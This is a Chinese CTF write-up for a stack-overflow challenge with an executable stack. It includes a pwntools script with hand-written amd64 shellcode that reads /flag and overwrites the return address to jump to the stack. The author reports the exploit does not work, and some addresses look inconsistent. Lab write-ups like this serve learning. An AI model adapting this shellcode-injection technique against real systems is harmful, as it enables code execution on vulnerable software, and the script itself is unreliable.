# 挑战简介
```
我们的堆栈指针指向 0x7fffffffce30，基指针指向 0x7ffffffced0。
这意味着我们的堆栈框架中有（十进制）22 个 8 字节字，
包括保存的基指针和保存的返回地址，
总共 176 个字节。
输入缓冲区从 0x7fffffffce50 开始，位于堆栈框架的中途，
（堆栈中“上方”是函数使用的其他局部变量）。
您的输入将被读入此缓冲区。
缓冲区长度为 103 个字节，但程序会允许您提供任意大的输入长度，从而溢出缓冲区。
我们已针对此挑战禁用以下标准内存损坏缓解措施：
- 禁用金丝雀，否则您会在覆盖返回地址之前损坏它，程序将中止。
- 二进制文件*不*与位置无关。这意味着每次运行时它都会位于同一位置，这意味着通过分析二进制文件（使用 objdump 或读取此输出），您可以知道需要用来覆盖返回地址的确切值。

- 二进制文件将禁用 aslr。这意味着每次运行时内存中的所有内容都会位于同一位置，这意味着通过分析二进制文件（使用 objdump 或读取此输出），您可以知道需要用来覆盖返回地址的确切值。
此外，您知道堆栈上所有内容的绝对地址。

- 堆栈是可执行的。这意味着如果堆栈包含 shellcode，并且您用该 shellcode 的地址覆盖返回地址，它将执行。

您已选择发送 4096 字节的输入！
这将允许您从 0x7fffffffce50（输入缓冲区的起始位置）写入
直到（但不包括）0x7fffffffde50（超出缓冲区末尾 3993 个字节）。
发送您的有效负载（最多 4096 个字节）！
```

# 思路
**关键点: 堆栈是可执行的**
这说明什么,我们可以直接将shellcode输入堆栈区,再在retaddress指向堆栈起始位置,从而执行shellcode  
喜闻乐见了(  
```
#!/usr/bin/python
from pwn import *
import struct
import os
cache_dir = '/tmp/.pwntools-cache'
if not os.path.exists(cache_dir):
    os.makedirs(cache_dir)

context(os='linux', arch='amd64', log_level='debug', cache_dir=cache_dir)
p = process('/challenge/binary-exploitation-hijack-to-shellcode-w')

#nop_sled_length = 0x900

#nop_sled = asm('nop') * nop_sled_length

shellcode = asm('''
    xor rax, rax                      # 清理rax
    push rax                          # 将0压入栈顶，代替NULL字节
    mov rbx, 0x67616c662f6a6a6a           # 将'/flag'分成两部分，避免NULL字节
    shr rbx, 24                        # 对齐
    push rbx                          # 推入栈
    mov rdi, rsp                      # rsp指向flag, 替代rdi
    xor rsi, rsi                      # 清理rsi
    xor rdx, rdx                      # 清理rdx
    mov al, 2                         # 执行打开指令 (使用al代替rax避免NULL字节)
    syscall                           # open('/flag', O_RDONLY)

    mov rdi, rax                      # 文件描述符
    mov rsi, rsp                      # 移动缓冲区进栈
    mov dl, 100                       # 读取的字节数 (使用dl代替rdx避免NULL字节)
    xor rax, rax                      # 执行读取指令
    syscall                           # read(fd, buffer, 0x100)

    mov dil, 1                        # 输出描述符 (使用edi代替rdi避免NULL字节)
    mov al, 1                         # 执行写入 (使用al代替rax避免NULL字节)
    syscall                           # write(stdout, buffer, 0x100)

''')

# 构建payload
#payload_o = nop_sled + shellcode

#payload = payload_o.ljust(0x1000, b'\x90')  # 填充剩余空间为NOP指令
print(len(shellcode))

p.recvuntil('Send your payload (up to 4096 bytes)!\n')

#p.send(b'a' * 0x88 + b'\x00\x70\x31\x1a\x00\x00')
win_address = p64(0x00007fffffffce70)    # 堆栈起始位置
p.send(shellcode + b'\x00' * 0x54 + win_address)    # 注入shellcode+填充\x00,在防止影响shellcode的同时,填充至retaddress+堆栈起始位置

output = p.recvall()
print(output.decode(errors='ignore'))
```
**尝试了直接注入shellcode,但是没起作用,懂得大佬求解答**
